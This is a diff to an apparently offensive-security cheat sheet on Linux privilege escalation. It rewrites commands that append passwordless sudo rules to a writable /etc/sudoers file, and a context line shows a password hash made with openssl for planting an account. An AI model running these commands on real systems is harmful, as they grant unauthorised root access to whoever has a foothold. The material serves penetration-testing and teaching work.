@@ -815,13 +815,16 @@ openssl passwd -1 -salt hack password123
  ```
 ### Writable /etc/sudoers
 ```
-echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
-echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
-
-# Allow members of group sudo to execute any command
+echo "$username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "$username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
+$username ALL=(ALL:ALL) ALL
+```
+Allow members of group sudo to execute any command
+```
 %sudo	ALL=(ALL:ALL) ALL
-
-# Allow members of group admin to execute any command
+```
+Allow members of group admin to execute any command
+```
 %admin 	ALL=(ALL:ALL) ALL
 ```
 ### Abusing LD_PRELOAD
